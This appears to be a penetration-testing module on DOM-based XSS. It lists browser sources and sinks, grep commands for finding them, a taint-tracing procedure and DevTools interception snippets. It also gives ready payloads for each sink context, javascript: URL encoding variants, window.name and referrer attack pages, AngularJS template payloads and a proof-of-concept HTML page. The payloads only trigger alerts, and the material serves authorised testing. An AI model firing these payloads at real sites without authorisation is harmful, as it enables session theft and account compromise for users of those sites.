# VULN MODULE — DOM-Based XSS
# Asset: webapp
# CWE-79 (DOM variant) | Report prefix: WEB-DOMXSS
# See also: xss_filter_evasion.md (payload bypass), ssti_csti.md (AngularJS/Vue CSTI)

## THREAT MODEL

DOM XSS differs from reflected/stored XSS: the payload never appears in the HTTP
response body. It is injected through a browser-side source (e.g. location.hash)
and reaches a dangerous sink (e.g. innerHTML) entirely within JavaScript running
in the victim's browser. Server-side scanners and WAFs cannot see it.

Key consequence: a 3XX redirect with a Location header is server-side and safe.
A `location.href = value` assignment inside JavaScript IS a DOM XSS sink.

Attack model: attacker crafts a URL → victim clicks it → browser JS reads the
malicious value from source → passes to sink → XSS fires.

---

## SOURCES — Where attacker-controlled data enters the DOM

Every source below can be manipulated through a crafted URL shared with the victim.

| Source | Example | Notes |
|--------|---------|-------|
| `location.hash` | `https://target.com/page#<payload>` | Not sent to server — pure client-side |
| `location.search` | `?q=<payload>` | Sent to server but also readable by JS |
| `location.href` | Full URL including hash+query | Includes everything |
| `document.URL` | Same as `location.href` | Read-only string of the full URL |
| `document.referrer` | Attacker page links to target | Controlled by linking page |
| `window.name` | Set by opener window | Persists across navigation — useful for filter bypass |
| `location.pathname` | URL path segment | Requires open redirect or path-based routing |

### Whitebox grep — find sources being read in JS
```bash
# All JS source reads
grep -rn "location\.hash\b\|location\.search\b\|location\.href\b" \
  --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx"
grep -rn "document\.URL\b\|document\.referrer\b\|window\.name\b" \
  --include="*.js" --include="*.ts"
grep -rn "URLSearchParams\|getParameterByName\|getQueryParam\|parseHash" \
  --include="*.js" --include="*.ts"

# For each hit: trace the variable forward — what happens to the value?
```

---

## SINKS — Where data causes code execution

### Execution sinks (highest severity)
| Sink | Notes |
|------|-------|
| `eval(data)` | Direct JS execution |
| `new Function(data)` | Same as eval — less obvious |
| `setTimeout(data, n)` | String argument is eval'd |
| `setInterval(data, n)` | Same as setTimeout |
| `document.write(data)` | Writes raw HTML to page |
| `innerHTML = data` | Parses and renders HTML tags |
| `outerHTML = data` | Same — replaces the element |
| `insertAdjacentHTML(pos, data)` | Injects HTML adjacent to element |
| `jQuery.html(data)` | Equivalent to innerHTML |
| `jQuery.append(data)` | Parses as HTML if string |
| `jQuery.prepend(data)` / `after()` / `before()` | Same |

### Navigation sinks (javascript: URL → execution)
| Sink | Notes |
|------|-------|
| `location = data` | If data is `javascript:alert(1)` → XSS |
| `location.href = data` | Same |
| `location.assign(data)` | Same |
| `location.replace(data)` | Same |
| `window.open(data)` | Opener XSS if javascript: accepted |

> Distinguishing safe vs dangerous redirect:
> - `HTTP 302 Location: https://...` header → **server-side, safe**
> - `location.href = value` inside JS → **DOM sink, dangerous if value is user-controlled**

### Whitebox grep — find sinks
```bash
# HTML injection sinks
grep -rn "innerHTML\s*=\|outerHTML\s*=\|insertAdjacentHTML(" \
  --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx"
grep -rn "document\.write(\|document\.writeln(" \
  --include="*.js" --include="*.ts"

# JS execution sinks
grep -rn "\beval(\|\bnew Function(\|setTimeout(['\"\`]\|setInterval(['\"\`]" \
  --include="*.js" --include="*.ts"

# Navigation sinks
grep -rn "location\.href\s*=\|location\.assign(\|location\.replace(\|location\s*=" \
  --include="*.js" --include="*.ts"
grep -rn "window\.open(" --include="*.js" --include="*.ts"

# jQuery sinks
grep -rn "\.html(\|\.append(\|\.prepend(\|\.after(\|\.before(\|\.replaceWith(" \
  --include="*.js" --include="*.ts"
# For each: check whether a user-controlled variable is passed as argument

# Framework-specific
grep -rn "bypassSecurityTrustHtml\|bypassSecurityTrustUrl\|bypassSecurityTrustScript" \
  --include="*.ts"                                          # Angular DomSanitizer bypass
grep -rn "v-html\b" --include="*.vue" --include="*.html"  # Vue — renders raw HTML
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx"  # React
```

### Taint tracing procedure
```
For each sink found:
  1. Read the variable name assigned to the sink (e.g. innerHTML = redirectUrl)
  2. Search backward for where redirectUrl is assigned
  3. Continue tracing until you reach a source (location.hash, getParam, etc.)
  4. Check every transformation step for sanitization:
     - encodeURIComponent / decodeURIComponent
     - DOMPurify.sanitize()
     - atob() / btoa() layers (see §Encoding Layers below)
     - regex replacements
  5. If source → sink path exists with no effective sanitization → DOM XSS candidate
```

---

## PAYLOADS BY SINK CONTEXT

### innerHTML / outerHTML / insertAdjacentHTML
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)<\/script>">
```

### eval() / new Function() / setTimeout(string)
```javascript
alert(document.domain)
// Context-specific: if injecting into a JS string that gets eval'd
// e.g. eval("var lang='" + location.hash.slice(1) + "'")
// Payload in hash: ';alert(document.domain);//
// Result: eval("var lang='';alert(document.domain);//'")

// Function() constructor bypass:
// Vulnerable: new Function('lang', 'return dict["' + lang + '"]')()
// Payload: en']&&alert(document.domain)//
// (closes the array access, executes alert, comments out rest)
```

### location.href / location.assign / location.replace (javascript: URL)
```
javascript:alert(document.domain)
// Encoding variants (see also xss_filter_evasion.md §3):
javascript&#58;alert(1)
java%0ascript:alert(1)
  javascript:alert(1)    ← leading whitespace stripped by browser
```

### window.name source (persistent, bypasses same-page filters)
```html
<!-- Attacker page: set window.name, then navigate victim to target -->
<script>
  window.name = '<img src=x onerror=alert(document.domain)>';
  location = 'https://target.com/vulnerable-page';
  // If target page reads window.name into innerHTML → XSS fires
</script>
```

### document.referrer source
```html
<!-- Attacker page that links to target — referrer is attacker URL -->
<!-- If attacker URL contains XSS payload and target reads document.referrer: -->
<a href="https://target.com/page">Click</a>
<!-- Target page: document.getElementById('x').innerHTML = document.referrer -->
<!-- URL to set as referrer: https://attacker.com/<img src=x onerror=alert(1)> -->
```

---

## TESTING METHODOLOGY

### Phase 1 — Source enumeration (static)
```bash
# Run whitebox greps above
# Build map: which sources are read, which variables they populate
# Build map: which sinks exist, which variables feed them
# Identify source→sink paths (even indirect — through helper functions)
```

### Phase 2 — Runtime interception (dynamic)

**Option A — Browser DevTools breakpoints**
```
1. Open DevTools → Sources tab
2. Add breakpoint on: Event Listener Breakpoints → Script → Script First Statement
   — OR —
   Right-click in Sources → Add logpoint on the sink line
3. Manipulate location.hash / location.search with a canary value
4. When breakpoint fires: inspect the call stack to see the full taint path
5. Check Sources → Event Listener Breakpoints → DOM Mutation → subtree modified
   to catch innerHTML assignments
```

**Option B — Console monkey-patching**
```javascript
// Paste in DevTools console to intercept innerHTML assignments
const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
  set(val) {
    if (val && val.length > 0) console.trace('[innerHTML]', val);
    return desc.set.call(this, val);
  }
});

// Intercept eval
const origEval = window.eval;
window.eval = function(code) {
  console.trace('[eval]', code);
  return origEval.call(this, code);
};

// Intercept location.href
const locDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
Object.defineProperty(location, 'href', {
  set(val) {
    console.trace('[location.href]', val);
    return locDesc.set.call(this, val);
  }
});
```

**Option C — Automated tools**
| Tool | Purpose | Usage |
|------|---------|-------|
| **Burp DOM Invader** | Auto-detects sources/sinks, injects canary, reports when canary reaches a sink | Enable in Burp browser → navigate target → check DOM Invader tab |
| **Untrusted Types** (Chrome ext) | Tracks data flow to dangerous sinks via Trusted Types API | Install → visit target → violations in DevTools console |
| **DalFox** | DOM XSS scanner with source/sink analysis | `dalfox url "https://target.com/page?q=FUZZ"` |

### Phase 3 — Payload construction

1. Identify sink context (HTML? JS string? URL? attribute?)
2. Select payload appropriate for context (see §Payloads above)
3. Check for encoding/transformation layers between source and sink
4. Adjust payload encoding accordingly (see §Encoding Layers below)
5. Test in browser — confirm `alert(document.domain)` fires

### Phase 4 — PoC
```html
<!DOCTYPE html>
<html>
<body>
<!-- Self-contained DOM XSS PoC -->
<!-- Victim must visit this page (or the crafted URL directly) -->
<script>
// Option A: if payload is in URL (share this URL with victim)
// https://target.com/page#<img src=x onerror=alert(document.domain)>

// Option B: if exploit requires opener context
window.open(
  'https://target.com/vulnerable?redirect=javascript:alert(document.domain)',
  '_blank'
);
</script>
</body>
</html>
```

---

## ENCODING LAYERS — Check between source and sink

Some apps decode the source value before writing to sink. Identify decoding functions
in the taint path and pre-encode your payload accordingly.

```bash
# Find decoding operations in taint path
grep -rn "atob(\|decodeURIComponent(\|decodeURI(\|unescape(" \
  --include="*.js" --include="*.ts"
# If atob() is applied to the source value before the sink:
# → your payload must be base64-encoded

# Find regex replacements that might strip characters
grep -rn "\.replace(" --include="*.js" --include="*.ts" | grep -i "script\|<\|>"
```

```javascript
// If atob() is applied:
btoa('<img src=x onerror=alert(document.domain)>')
// → 'PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+'

// If double decoding:
encodeURIComponent(encodeURIComponent('<img src=x onerror=alert(1)>'))

// If CRLF or null byte in source before sink:
// Null byte: payload%00suffix  (null terminates filter check, not sink)
// CRLF:      payload%0d%0a     (breaks out of string context in some sinks)
```

---

## FRAMEWORK-SPECIFIC PATTERNS

### AngularJS (ng-app) — CSTI → DOM XSS
```javascript
// If user input reaches an AngularJS template expression scope:
{{constructor.constructor('alert(document.domain)')()}}

// Check version — payloads differ (see ssti_csti.md for version-specific bypasses)
// Auto-load trigger: grep -rn "ng-app\|angular\.module\|ng-controller" --include="*.html"
```

### Vue.js
```javascript
// DOM XSS via v-html directive with user data:
// <div v-html="userContent"></div>
// Any XSS payload works — Vue does not sanitize v-html

// Vue template injection (if Vue.compile receives user input):
// {{constructor.constructor('alert(1)')()}}
```

### jQuery (legacy apps)
```javascript
// All of these parse the string as HTML if it starts with <:
$('#el').html(userValue)
$('<div>').append(userValue).appendTo('body')
$(userValue)          // jQuery(selector) — if selector starts with < → HTML parsed

// jQuery selector sink:
// If location.hash is passed to $():
// $(location.hash)  ← Classic DOM XSS in many legacy apps
// Payload: #<img src=x onerror=alert(1)>
```

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `location.hash` or `location.search` read in JS source → DOM source present
- `innerHTML =` or `document.write(` in JS → DOM sink present
- jQuery `$(location.hash)` or `.html(` pattern found
- `eval(` receiving a variable (not a literal string)
- `bypassSecurityTrust*` in Angular / `v-html` in Vue / `dangerouslySetInnerHTML` in React
